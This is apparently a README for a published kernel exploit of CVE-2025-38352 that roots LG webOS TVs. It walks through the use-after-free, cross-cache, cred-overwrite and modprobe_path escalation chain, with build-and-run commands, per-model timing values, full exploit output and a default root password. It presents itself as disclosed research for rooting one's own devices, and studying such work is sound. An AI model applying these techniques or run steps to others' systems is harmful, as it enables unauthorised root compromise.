# Chronomaly — CVE-2025-38352 on LG webOS

Kernel exploit for [CVE-2025-38352](https://source.android.com/docs/security/bulletin/2025-09-01) (POSIX CPU timer race condition / use-after-free) achieving persistent root on LG webOS Smart TVs running kernel 5.4.268 on ARM64. Verified on 4 TV models across multiple firmware versions. Responsibly disclosed to LG's Security Researcher Program (February 2026).

Built on [Chronomaly](https://github.com/farazsth98/chronomaly) by [farazsth98](https://github.com/farazsth98). Stage 1 UAF race logic and cross-cache infrastructure ported and adapted for ARM64; Stages 2–5 redesigned with novel exploitation techniques and solutions to real-hardware constraints that do not exist in emulated environments. Developed with the assistance of Claude Opus 4.6.

See [VULNERABILITY_REPORT.md](VULNERABILITY_REPORT.md) for the full vulnerability analysis, exploit chain walkthrough, and recommended mitigations.

## Results

- Persistent kernel root (uid=0) from unprivileged `prisoner` user (uid=5038)
- Verified on 5 LG TV models: OLED65C2PUA, 86QNED70AUA, OLED77C5PUA, OLED77G4WUA, OLED65C4PUA
- Confirmed across firmware versions 33.22.65 – 33.30.97 (kernel 5.4.268-320 and -329)
- Fully automated, completes within minutes, survives reboots via Homebrew Channel elevation
- Reported to LG Security Researcher Program (February 7, 2026)

## Disclaimer

This exploit was developed as part of responsible security research and reported to LG's Security Researcher Program on February 7, 2026. It is published for educational purposes only. Use responsibly and only on devices you own. The authors are not responsible for any damage, bricking, data loss, or warranty voiding resulting from use of this software. This software is provided as-is with no warranty.

## Novel Techniques

### 1. Redesigned Write Primitive

The original's arbitrary decrement is slow and noisy: it sprays 1,000 `struct cred` objects via forked processes, then decrements a target cred's EUID field N times. Each decrement is a separate operation. This is acceptable in QEMU where timing is forgiving, but unreliable on real hardware where interrupt-driven page reclamation can steal pipe buffer pages between operations.

This was replaced with a single arbitrary write via `list_del_init()`. The exploit overwrites the UAF'd sigqueue's `list_head.next` and `list_head.prev` pointers through the pipe buffer. When the kernel dequeues the pending signal (`collect_signal()` → `list_del_init()`), it performs `prev->next = next` (writes the fake cred address into `task_struct->cred`) and `next->prev = prev` (controlled side-effect write). One write replaces the process's cred pointer with a pointer to a fake cred structure containing all-zero uid/gid fields. No cred spray, no forked processes, deterministic.

### 2. `peek_pipe()` via `tee()` for Non-Destructive Reads

The original uses destructive `read()` calls on pipe buffers throughout the exploit. In QEMU, this works fine because pages are not stolen between operations. On real hardware with 4 physical cores, the kernel's per-CPU page list (pcplist) aggressively reclaims freed pages. A destructive read releases the pipe buffer's backing page, which can be immediately stolen by a hardware interrupt before the exploit can reallocate it.

The solution is a non-destructive pipe read primitive using `tee()`. The `tee()` syscall duplicates pipe data between two pipes without consuming it, keeping the original pipe buffer's backing page pinned. This allows the exploit to read kernel data from the cross-cached pipe buffer repeatedly without risking page loss. This was critical for reliability on real hardware.

### 3. Fake Cred in Second Cross-Cached Pipe Buffer

The original sprays cred objects and hopes to land one in a predictable location. This version constructs the fake cred structure at a known address by performing a second cross-cache: allocate a new sigqueue (via `tkill(SIGRTMIN+1)`), learn its address from the first pipe buffer's heap leak, then cross-cache that sigqueue's slab page into a second pipe buffer. The fake cred is written into the second pipe buffer at the exact page offset of the leaked sigqueue address. The result is a fake cred at a deterministic kernel virtual address with no guesswork.

### 4. SIGUSR2 Kept Pending as Final Write Trigger

The original dequeues SIGUSR2 early in Stage 2 to leak the UAF sigqueue's address. This consumes the signal, so the original needs a different mechanism for the final write. This version never needs the UAF sigqueue's own address (the heap leak comes from adjacent sigqueue pointers in the pipe buffer). SIGUSR2 is kept pending across all five stages and its dequeue is used as the final arbitrary write trigger. The signal that created the UAF is the same signal whose dequeue exploits it.

### 5. `modprobe_path` + `socket(44)` Escalation

The fake cred structure has NULL `user_ns`, `user`, and `group_info` pointers (since the pipe buffer is zero-initialized beyond the uid/gid fields). Calling `setresuid()`, `fork()`, or `exec()` would dereference these NULL pointers and kernel panic. The original avoids this because its cred spray uses real cred objects with valid pointers.

The solution: overwrite `/proc/sys/kernel/modprobe` to point to a payload script (`/tmp/pwn`), then trigger `call_usermodehelper` via `socket(44, SOCK_STREAM, 0)` (requesting a non-existent protocol family). The kernel executes the modprobe helper with `init_cred` (the kernel's own root credentials, fully valid), bypassing the corrupted cred entirely. The payload runs as full root and can perform arbitrary operations.

### 6. Real-Hardware Timing Protection

The critical window in Stage 4 (writing malicious pointers into the pipe buffer, then triggering signal dequeue) is vulnerable to hardware interrupts stealing the pipe buffer page from the per-CPU page list. This does not happen in QEMU. On real hardware, this window is protected with `SCHED_FIFO` priority (when available) and `sched_yield()` to let pending work complete on the CPU before entering the critical section, plus pre-prepared buffer contents to minimize the time between write and trigger. The exploit also falls back gracefully when `SCHED_FIFO` is unavailable (as on webOS where the prisoner user lacks `CAP_SYS_NICE`).

### 7. ARM64 `task_struct` Offset Reverse Engineering

The arbitrary write targets `task_struct->cred`, which requires knowing the byte offset from `task_struct->pending` (whose address is leaked from the pipe buffer) to `task_struct->cred`. This offset is kernel-config-dependent. The 0x80 (128 byte) offset was manually computed from the LG webOS kernel source, accounting for `CONFIG_KEYS=y`, `CONFIG_SYSVIPC=y`, and ARM64-specific struct layout and alignment. The x86_64 offset in the original is different due to different struct packing and config options.

---

## What It Does

On success, the exploit:
1. Gains kernel root via UAF → cross-cache → arbitrary write (cred overwrite)
2. Overwrites `/proc/sys/kernel/modprobe` to run a rooting payload as init
3. The payload installs and elevates [Homebrew Channel](https://github.com/webosbrew/webos-homebrew-channel) and removes Dev Mode app
4. After reboot, Homebrew Channel provides persistent root SSH on port 22

## Quick Start

### Prerequisites

- LG webOS TV with kernel 5.4.268 (ARM64)
- Dev Mode enabled on the TV (SSH access on port 9922)
- ARM64 cross-compiler (`aarch64-linux-gnu-gcc`)
- Homebrew Channel IPK — download from [webosbrew releases](https://github.com/webosbrew/webos-homebrew-channel/releases/)

### Install Cross-Compiler

```bash
# macOS (requires third-party tap)
brew tap messense/macos-cross-toolchains
brew install aarch64-unknown-linux-gnu

# Ubuntu/Debian
sudo apt-get install gcc-aarch64-linux-gnu
```

### Recommended: Install [Homebrew Channel](https://github.com/webosbrew/webos-homebrew-channel) First

Install the Homebrew Channel app on your TV via Dev Mode **before** running the exploit. This way the rooting payload only needs to elevate it (fast, reliable) rather than install + elevate (slower, can fail). You can sideload it using `ares-install` or the Dev Manager app:

```bash
ares-install org.webosbrew.hbchannel_0.7.3_all.ipk
```

If HBC is not pre-installed, the exploit will attempt to install it from `/tmp/hbchannel.ipk` (deployed by `deploy-webos.sh`), but this adds extra steps that can fail.

### Build, Deploy, Run

```bash
# 1. Set your TV's IP and SSH key
#    Your TV's IP is in Settings > Network > Wi-Fi > Advanced Settings
#    The SSH key is generated by the LG Developer Mode app — look for the key
#    downloaded by Dev Manager or ares-setup-device (typically named webos_rsa)
export WEBOS_IP="<TV_IP>"
export WEBOS_KEY="$HOME/.ssh/webos_rsa"

# 2. Build and deploy (deploy-webos.sh handles the build automatically)
./deploy-webos.sh

# 3. Connect and run
ssh -i "$WEBOS_KEY" -p 9922 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa prisoner@$WEBOS_IP
/tmp/exploit-arm64
```

## Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `WEBOS_IP` | `192.168.1.100` | TV IP address |
| `WEBOS_PORT` | `9922` | SSH port |
| `WEBOS_USER` | `prisoner` | SSH user |
| `WEBOS_KEY` | `$HOME/.ssh/webos_rsa` | SSH key path |

## Tuning

The exploit accepts timing parameters as command-line arguments:

```bash
/tmp/exploit-arm64 [DELAY] [DELTA] [THRESHOLD]
```

If no arguments are provided, compiled defaults are used (DELAY=31000, DELTA=50, THRESHOLD=3000).
If DELAY is provided but DELTA is not, DELTA is auto-computed as `DELAY / 600` (rounded to nearest 5).

### Known Good Values

| TV Model | OTA ID | DELAY | DELTA | THRESHOLD |
|----------|--------|-------|-------|-----------|
| OLED65C2PUA | HE_DTV_W22O_AFABATPU | 29700 | 50 | 3000 |
| 86QNED70AUA | HE_DTV_W25P_AFADATAA | 100000 | 165 | 3000 |
| OLED77C5PUA | HE_DTV_W25G_AFABATAA | 30500 | 50 | 3000 |
| OLED77G4WUA | HE_DTV_W24O_AFABATAA | 24500 | 50 | 2500 |
| OLED65C4PUA | FW: 33.21.85 | 30000 | 50 | 3000 |

### Finding Values for a New TV

Watch the exploit output and adjust DELAY:

```
Parent raced too late   → DECREASE DELAY
Parent raced too early  → INCREASE DELAY
```

When both messages appear, the timing is close — keep running and the exploit should eventually hit the race window. Start with the compiled default (31000) and adjust from there.

## After Root

1. The exploit will wait for `/tmp/pwn` to finish — it often times out (this is normal). Check `/tmp/pwn.log` to manually verify that the payload completed if needed.
2. Reboot the TV
3. After reboot, Homebrew Channel provides SSH on port 22:
   ```bash
   ssh root@<TV_IP>
   # password: alpine
   ```

---

## Sample Output

```
[*] Chronomaly - CVE-2025-38352 - webOS ARM64
[*] Config: DELAY=30500 DELTA=50 THRESH=3000 EPOLL=250 SFD=60
[*] Initializing...
[*] Racing...
[*] getpid() timing: 165 ns
        [+] Freed UAF sigqueue in parent process pid 28522

[+] Stage 2 - Cross-cache the UAF sigqueue's slab
        [+] Reallocated UAF sigqueue slab as a pipe buffer data page
        [+] Heap leak successful! Continuing...
        [+] SIGUSR2 kept pending - UAF sigqueue stays in list

[+] Stage 3 - Cross-cache new sigqueue's slab to second pipe buffer
        [+] fake_cred_addr = 0xffffff804908c820

[+] Stage 4 - Set up arbitrary write via UAF sigqueue
        [+] Will write: *0xffffff8048591378 = 0xffffff804908c820
        [+] SIGUSR2 still pending from Stage 1
        [DEBUG] All sigqueue fields verified OK

[+] Stage 5 - Trigger arbitrary write via signal dequeue
        [+] Signal dequeued successfully!
        [+] Arbitrary write completed: task->cred now points to fake_cred
        [+] Current EUID: 0, UID: 1213797240

         ██████╗  ██████╗  ██████╗ ████████╗    ██╗
         ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝    ██║
         ██████╔╝██║   ██║██║   ██║   ██║       ██║
         ██╔══██╗██║   ██║██║   ██║   ██║       ╚═╝
         ██║  ██║╚██████╔╝╚██████╔╝   ██║       ██╗
         ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝       ╚═╝

        [+] ROOT ACHIEVED! EUID = 0
        [+] modprobe -> /tmp/pwn
        [+] Rooting payload executed!
```

<details>
<summary>Full output (OLED C5)</summary>

```
[*] Chronomaly - CVE-2025-38352 - webOS ARM64
[*] Config: DELAY=30500 DELTA=50 THRESH=3000 EPOLL=250 SFD=60
[*] Initializing...
[*] Racing...
[*] getpid() timing: 165 ns
        [+] Freed UAF sigqueue in parent process pid 28522

[+] Stage 2 - Cross-cache the UAF sigqueue's slab
        [+] Reallocated UAF sigqueue slab as a pipe buffer data page
        [+] Cleaning up all cross-cache allocations to prepare for next cross-cache
        [+] Preparing task pending list for heap leaks
        [DEBUG] Pipe buffer page dump (non-zero qwords):
        [DEBUG]   offset 0x960: 0xffffff804dbee2d0 [kernel ptr]
        [DEBUG]   offset 0x968: 0xffffff80485913f8 [kernel ptr]
        [+] Heap leaks:
                - UAF sigqueue page offset 0x960
                - Other sigqueue 0xffffff804dbee2d0
                - Task pending list addr 0xffffff80485913f8
        [+] Heap leak successful! Continuing...
        [+] SIGUSR2 kept pending - UAF sigqueue stays in list

[+] Stage 3 - Cross-cache new sigqueue's slab to second pipe buffer
        [+] new_addr = 0xffffff804908c820 (page offset 0x820)
        [+] Dequeuing SIGRTMIN+1 (2nd time) to free new sigqueue from slab 3...
        [+] Freeing slab 3 page...
        [+] Writing fake cred at page offset 0x820
        [+] Reclaimed slab 3 page as second pipe buffer (with fake cred)
        [+] fake_cred_addr = 0xffffff804908c820 (= new_addr from Stage 3 SIGRTMIN+1)

[+] Stage 4 - Set up arbitrary write via UAF sigqueue
        [+] task_pending_list_addr = 0xffffff80485913f8
        [+] cred_offset = 0x80 (128 bytes)
        [+] task_cred_ptr_addr = 0xffffff8048591378
        [+] fake_cred_addr = 0xffffff804908c820
        [+] Will write: *0xffffff8048591378 = 0xffffff804908c820
        [+] SIGUSR2 still pending from Stage 1
        [-] SCHED_FIFO unavailable - proceeding anyway
        [DEBUG] Verifying sigqueue fields in pipe buffer:
        [DEBUG]   list.next  = 0xffffff804908c820 (expected 0xffffff804908c820) OK
        [DEBUG]   list.prev  = 0xffffff8048591378 (expected 0xffffff8048591378) OK
        [DEBUG]   flags      = 1 (expected 1) OK
        [DEBUG]   si_signo   = 12 (expected 12 = SIGUSR2) OK
        [DEBUG]   All sigqueue fields verified OK

[+] Stage 5 - Trigger arbitrary write via signal dequeue
        [+] Dequeuing ORIGINAL SIGUSR2 from Stage 1 (never dequeued until now)
        [+] This triggers list_del_init: *0xffffff8048591378 = 0xffffff804908c820
        [DEBUG] poll() returned 1, revents=0x1
        [DEBUG] SIGUSR2 = 12, sigusr2_sfd = 5
        [DEBUG] Key addresses for list_del_init:
        [DEBUG]   UAF.prev (entry->prev) = task_cred_ptr = 0xffffff8048591378
        [DEBUG]   UAF.next (entry->next) = fake_cred     = 0xffffff804908c820
        [DEBUG]   fake_cred[0] should be task_pending_list = 0xffffff80485913f8
        [DEBUG] Expected writes:
        [DEBUG]   *(0xffffff8048591378) = 0xffffff804908c820  (task->cred = fake_cred)
        [DEBUG]   *(0xffffff804908c828) = 0xffffff8048591378  (fake_cred.prev = task_cred_ptr)
        [DEBUG] Verifying pipe buffers still valid...
        [DEBUG]   realloc_pipe read(0) = 0 (errno=1)
        [DEBUG] About to call read(sigusr2_sfd) - this triggers list_del_init...
        [DEBUG] NOTE: If it hangs here, the exploit has failed and you must start over.
        [DEBUG] read() returned 128, errno=0 (Success)
        [DEBUG] Blocking mode restored
        [+] Signal dequeued successfully! (read 128 bytes)
        [DEBUG] POST-DEQUEUE pipe buffer check:
        [DEBUG]   list.next = 0xffffff80417e9960
        [DEBUG]   list.prev = 0xffffff80417e9960
        [DEBUG]   Pointers changed by kernel (list_del_init applied to our page)
        [+] Arbitrary write completed: task->cred now points to fake_cred

        [+] Checking privileges...
        [+] Current EUID: 0, UID: 1213797240

         ██████╗  ██████╗  ██████╗ ████████╗    ██╗
         ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝    ██║
         ██████╔╝██║   ██║██║   ██║   ██║       ██║
         ██╔══██╗██║   ██║██║   ██║   ██║       ╚═╝
         ██║  ██║╚██████╔╝╚██████╔╝   ██║       ██╗
         ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝       ╚═╝

        [+] ROOT ACHIEVED! EUID = 0
        [+] modprobe -> /tmp/pwn
        [+] Rooting payload executed!
        [+] Waiting for /tmp/pwn to finish...
        [+] May take up to 5 minutes to finish.
```

</details>

## License

Original contributions are MIT-licensed. Portions derived from [Chronomaly](https://github.com/farazsth98/chronomaly) by farazsth98 are excluded from the MIT grant because the upstream project was published without an explicit license. See [LICENSE](LICENSE) for details.

## References

- [CVE-2025-38352](https://source.android.com/docs/security/bulletin/2025-09-01) — September 2025 Android Security Bulletin (exploited in the wild)
- [Chronomaly](https://github.com/farazsth98/chronomaly) — Original exploit by farazsth98 (x86_64/QEMU)
- [Part 1 — In-the-wild Android Kernel Vulnerability Analysis + PoC](https://faith2dxy.xyz/2025-12-22/cve_2025_38352_analysis/)
- [Part 2 — Extending The Race Window Without a Kernel Patch](https://faith2dxy.xyz/2025-12-24/cve_2025_38352_analysis_part_2/)
- [Part 3 — Uncovering Chronomaly](https://faith2dxy.xyz/2026-01-03/cve_2025_38352_analysis_part_3/)
- [Homebrew Channel](https://github.com/webosbrew/webos-homebrew-channel)
